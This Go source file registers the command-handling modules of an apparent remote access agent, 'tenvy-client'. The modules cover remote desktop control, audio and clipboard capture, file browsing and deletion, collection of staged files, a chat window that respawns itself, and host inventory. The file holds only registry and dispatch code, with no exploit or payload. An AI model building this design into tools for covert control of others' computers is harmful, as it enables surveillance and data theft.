package agent

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"

	audioctrl "github.com/rootbay/tenvy-client/internal/modules/control/audio"
	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
	filemanager "github.com/rootbay/tenvy-client/internal/modules/management/filemanager"
	tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
	"github.com/rootbay/tenvy-client/internal/protocol"
)

type moduleRuntime struct {
	AgentID      string
	BaseURL      string
	AuthKey      string
	HTTPClient   *http.Client
	Logger       *log.Logger
	UserAgent    string
	Provider     systeminfo.AgentInfoProvider
	BuildVersion string
}

type ModuleCapability struct {
	Name        string
	Description string
}

type ModuleMetadata struct {
	ID           string
	Title        string
	Description  string
	Commands     []string
	Capabilities []ModuleCapability
}

type module interface {
	Metadata() ModuleMetadata
	Update(moduleRuntime) error
	HandleCommand(context.Context, protocol.Command) protocol.CommandResult
	Shutdown(context.Context)
}

type moduleEntry struct {
	module   module
	metadata ModuleMetadata
	commands []string
}

type moduleRegistry struct {
	mu        sync.RWMutex
	modules   map[string]*moduleEntry
	lifecycle []*moduleEntry
	remote    *remoteDesktopModule
}

func newDefaultModuleRegistry() *moduleRegistry {
	registry := newModuleRegistry()
	registry.register(&remoteDesktopModule{})
	registry.register(&audioModule{})
	registry.register(&clipboardModule{})
	registry.register(&fileManagerModule{})
	registry.register(&tcpConnectionsModule{})
	registry.register(&clientChatModule{})
	registry.register(&recoveryModule{})
	registry.register(&systemInfoModule{})
	return registry
}

func newModuleRegistry() *moduleRegistry {
	return &moduleRegistry{
		modules:   make(map[string]*moduleEntry),
		lifecycle: make([]*moduleEntry, 0, 6),
	}
}

func (r *moduleRegistry) register(m module) {
	metadata := m.Metadata()
	if strings.TrimSpace(metadata.ID) == "" {
		panic("agent module missing metadata id")
	}
	commands := metadata.Commands
	if len(commands) == 0 {
		panic(fmt.Sprintf("agent module %s does not declare any commands", metadata.ID))
	}
	entry := &moduleEntry{
		module:   m,
		metadata: metadata,
		commands: append([]string(nil), commands...),
	}
	if remote, ok := m.(*remoteDesktopModule); ok {
		r.remote = remote
	}
	r.lifecycle = append(r.lifecycle, entry)
	for _, command := range entry.commands {
		if strings.TrimSpace(command) == "" {
			continue
		}
		if existing, ok := r.modules[command]; ok {
			panic(fmt.Sprintf("command %q already registered by module %s", command, existing.metadata.ID))
		}
		r.modules[command] = entry
	}
}

func (r *moduleRegistry) Update(runtime moduleRuntime) error {
	r.mu.Lock()
	defer r.mu.Unlock()

	var errs []error
	for _, entry := range r.lifecycle {
		if err := entry.module.Update(runtime); err != nil {
			label := entry.metadata.Title
			if strings.TrimSpace(label) == "" {
				label = entry.metadata.ID
			}
			errs = append(errs, fmt.Errorf("%s: %w", label, err))
		}
	}

	return errors.Join(errs...)
}

func (r *moduleRegistry) Metadata() []ModuleMetadata {
	r.mu.RLock()
	defer r.mu.RUnlock()

	metadata := make([]ModuleMetadata, 0, len(r.lifecycle))
	for _, entry := range r.lifecycle {
		metadata = append(metadata, entry.metadata)
	}
	return metadata
}

func (r *moduleRegistry) HandleCommand(ctx context.Context, cmd protocol.Command) (bool, protocol.CommandResult) {
	r.mu.RLock()
	entry, ok := r.modules[cmd.Name]
	r.mu.RUnlock()
	if !ok {
		return false, protocol.CommandResult{}
	}
	return true, entry.module.HandleCommand(ctx, cmd)
}

func (r *moduleRegistry) Shutdown(ctx context.Context) {
	r.mu.RLock()
	entries := append([]*moduleEntry(nil), r.lifecycle...)
	r.mu.RUnlock()

	for index := len(entries) - 1; index >= 0; index-- {
		entries[index].module.Shutdown(ctx)
	}
}

func (r *moduleRegistry) remoteDesktopModule() *remoteDesktopModule {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.remote
}

func (a *Agent) moduleRuntime() moduleRuntime {
	return moduleRuntime{
		AgentID:      a.id,
		BaseURL:      a.baseURL,
		AuthKey:      a.key,
		HTTPClient:   a.client,
		Logger:       a.logger,
		UserAgent:    a.userAgent(),
		Provider:     a,
		BuildVersion: a.buildVersion,
	}
}

type remoteDesktopModule struct {
	streamer *remotedesktop.RemoteDesktopStreamer
}

func (m *remoteDesktopModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "remote-desktop",
		Title:       "Remote Desktop",
		Description: "Interactive remote desktop streaming and control.",
		Commands:    []string{"remote-desktop"},
		Capabilities: []ModuleCapability{
			{
				Name:        "remote-desktop.stream",
				Description: "Stream high fidelity desktop frames to the controller UI.",
			},
			{
				Name:        "remote-desktop.input",
				Description: "Relay keyboard and pointer input events back to the host.",
			},
		},
	}
}

func (m *remoteDesktopModule) Update(runtime moduleRuntime) error {
	var requestTimeout time.Duration
	if runtime.HTTPClient != nil {
		requestTimeout = runtime.HTTPClient.Timeout
	}
	cfg := remotedesktop.Config{
		AgentID:        runtime.AgentID,
		BaseURL:        runtime.BaseURL,
		AuthKey:        runtime.AuthKey,
		Client:         runtime.HTTPClient,
		Logger:         runtime.Logger,
		UserAgent:      runtime.UserAgent,
		RequestTimeout: requestTimeout,
	}
	if m.streamer == nil {
		m.streamer = remotedesktop.NewRemoteDesktopStreamer(cfg)
		return nil
	}
	m.streamer.UpdateConfig(cfg)
	return nil
}

func (m *remoteDesktopModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.streamer == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "remote desktop subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.streamer.HandleCommand(ctx, cmd)
}

func (m *remoteDesktopModule) HandleInputBurst(ctx context.Context, burst protocol.RemoteDesktopInputBurst) error {
	if m.streamer == nil {
		return errors.New("remote desktop subsystem not initialized")
	}
	if len(burst.Events) == 0 {
		return nil
	}

	events := make([]remotedesktop.RemoteDesktopInputEvent, 0, len(burst.Events))
	for _, evt := range burst.Events {
		event := remotedesktop.RemoteDesktopInputEvent{
			Type:       remotedesktop.RemoteDesktopInputType(evt.Type),
			CapturedAt: evt.CapturedAt,
			X:          evt.X,
			Y:          evt.Y,
			Normalized: evt.Normalized,
			Monitor:    evt.Monitor,
			Button:     remotedesktop.RemoteDesktopMouseButton(evt.Button),
			Pressed:    evt.Pressed,
			DeltaX:     evt.DeltaX,
			DeltaY:     evt.DeltaY,
			DeltaMode:  evt.DeltaMode,
			Key:        evt.Key,
			Code:       evt.Code,
			KeyCode:    evt.KeyCode,
			Repeat:     evt.Repeat,
			AltKey:     evt.AltKey,
			CtrlKey:    evt.CtrlKey,
			ShiftKey:   evt.ShiftKey,
			MetaKey:    evt.MetaKey,
		}
		events = append(events, event)
	}

	payload := remotedesktop.RemoteDesktopCommandPayload{
		Action:    "input",
		SessionID: burst.SessionID,
		Events:    events,
	}

	return m.streamer.HandleInputPayload(ctx, payload)
}

func (m *remoteDesktopModule) Shutdown(context.Context) {
	if m.streamer != nil {
		m.streamer.Shutdown()
	}
}

type audioModule struct {
	bridge *audioctrl.AudioBridge
}

func (m *audioModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "audio-control",
		Title:       "Audio Control",
		Description: "Capture and inject audio streams across the remote session.",
		Commands:    []string{"audio-control"},
		Capabilities: []ModuleCapability{
			{
				Name:        "audio.capture",
				Description: "Capture remote system audio for operator playback.",
			},
			{
				Name:        "audio.inject",
				Description: "Inject operator supplied audio into the remote session.",
			},
		},
	}
}

func (m *audioModule) Update(runtime moduleRuntime) error {
	cfg := audioctrl.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.bridge == nil {
		m.bridge = audioctrl.NewAudioBridge(cfg)
		return nil
	}
	m.bridge.UpdateConfig(cfg)
	return nil
}

func (m *audioModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.bridge == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "audio subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.bridge.HandleCommand(ctx, cmd)
}

func (m *audioModule) Shutdown(context.Context) {
	if m.bridge != nil {
		m.bridge.Shutdown()
	}
}

type clipboardModule struct {
	manager *clipboard.Manager
}

func (m *clipboardModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "clipboard",
		Title:       "Clipboard Manager",
		Description: "Synchronize clipboard data between the operator and remote host.",
		Commands:    []string{"clipboard"},
		Capabilities: []ModuleCapability{
			{
				Name:        "clipboard.capture",
				Description: "Capture clipboard updates emitted by the remote workstation.",
			},
			{
				Name:        "clipboard.push",
				Description: "Push operator provided clipboard payloads to the remote host.",
			},
		},
	}
}

func (m *clipboardModule) Update(runtime moduleRuntime) error {
	cfg := clipboard.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = clipboard.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *clipboardModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.manager == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "clipboard subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.manager.HandleCommand(ctx, cmd)
}

func (m *clipboardModule) Shutdown(context.Context) {
	if m.manager != nil {
		m.manager.Shutdown()
	}
}

type fileManagerModule struct {
	manager *filemanager.Manager
}

func (m *fileManagerModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "file-manager",
		Title:       "File Manager",
		Description: "Inspect and manage the remote file system.",
		Commands:    []string{"file-manager"},
		Capabilities: []ModuleCapability{
			{
				Name:        "file-manager.explore",
				Description: "Enumerate directories and retrieve file contents from the host.",
			},
			{
				Name:        "file-manager.modify",
				Description: "Create, update, move, and delete files and directories on demand.",
			},
		},
	}
}

func (m *fileManagerModule) Update(runtime moduleRuntime) error {
	cfg := filemanager.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = filemanager.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *fileManagerModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.manager == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "file manager subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.manager.HandleCommand(ctx, cmd)
}

func (m *fileManagerModule) Shutdown(context.Context) {
	// no teardown required for file system operations today
}

type tcpConnectionsModule struct {
	manager *tcpconnections.Manager
}

func (m *tcpConnectionsModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "tcp-connections",
		Title:       "TCP Connections",
		Description: "Enumerate and govern active TCP sockets exposed by the host.",
		Commands:    []string{"tcp-connections"},
		Capabilities: []ModuleCapability{
			{
				Name:        "tcp-connections.enumerate",
				Description: "Collect real-time socket state with process attribution.",
			},
			{
				Name:        "tcp-connections.control",
				Description: "Stage enforcement actions for suspicious remote peers.",
			},
		},
	}
}

func (m *tcpConnectionsModule) Update(runtime moduleRuntime) error {
	cfg := tcpconnections.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = tcpconnections.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *tcpConnectionsModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.manager == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "tcp connections subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.manager.HandleCommand(ctx, cmd)
}

func (m *tcpConnectionsModule) Shutdown(context.Context) {
	// no shutdown hooks required for TCP connection sweeps today
}

type recoveryModule struct {
	manager *recovery.Manager
}

func (m *recoveryModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "recovery",
		Title:       "Recovery Operations",
		Description: "Coordinate staged collection tasks and payload recovery.",
		Commands:    []string{"recovery"},
		Capabilities: []ModuleCapability{
			{
				Name:        "recovery.queue",
				Description: "Queue recovery jobs for background execution.",
			},
			{
				Name:        "recovery.collect",
				Description: "Collect files and artifacts staged by other modules.",
			},
		},
	}
}

func (m *recoveryModule) Update(runtime moduleRuntime) error {
	cfg := recovery.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = recovery.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *recoveryModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.manager == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "recovery subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.manager.HandleCommand(ctx, cmd)
}

func (m *recoveryModule) Shutdown(context.Context) {
	if m.manager != nil {
		m.manager.Shutdown()
	}
}

type clientChatModule struct {
	supervisor *clientchat.Supervisor
}

func (m *clientChatModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "client-chat",
		Title:       "Client Chat",
		Description: "Maintain a persistent, controller-managed chat window on the client.",
		Commands:    []string{"client-chat"},
		Capabilities: []ModuleCapability{
			{
				Name:        "client-chat.persist",
				Description: "Respawn the client chat interface if the process terminates unexpectedly.",
			},
			{
				Name:        "client-chat.alias",
				Description: "Apply controller-provided aliases for both participants in real time.",
			},
		},
	}
}

func (m *clientChatModule) Update(runtime moduleRuntime) error {
	cfg := clientchat.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.supervisor == nil {
		m.supervisor = clientchat.NewSupervisor(cfg)
		return nil
	}
	m.supervisor.UpdateConfig(cfg)
	return nil
}

func (m *clientChatModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.supervisor == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "client chat subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.supervisor.HandleCommand(ctx, cmd)
}

func (m *clientChatModule) Shutdown(ctx context.Context) {
	if m.supervisor != nil {
		m.supervisor.Shutdown(ctx)
	}
}

type systemInfoModule struct {
	collector *systeminfo.Collector
}

func (m *systemInfoModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "system-info",
		Title:       "System Information",
		Description: "Collect host metadata, hardware configuration, and runtime inventory.",
		Commands:    []string{"system-info"},
		Capabilities: []ModuleCapability{
			{
				Name:        "system-info.snapshot",
				Description: "Provide a structured snapshot of operating system and hardware data.",
			},
			{
				Name:        "system-info.telemetry",
				Description: "Report live telemetry metrics used by other modules for scheduling.",
			},
		},
	}
}

func (m *systemInfoModule) Update(runtime moduleRuntime) error {
	if runtime.Provider == nil {
		return fmt.Errorf("missing agent provider")
	}
	m.collector = systeminfo.NewCollector(runtime.Provider, runtime.BuildVersion)
	return nil
}

func (m *systemInfoModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	if m.collector == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "system information subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
	return m.collector.HandleCommand(ctx, cmd)
}

func (m *systemInfoModule) Shutdown(context.Context) {}
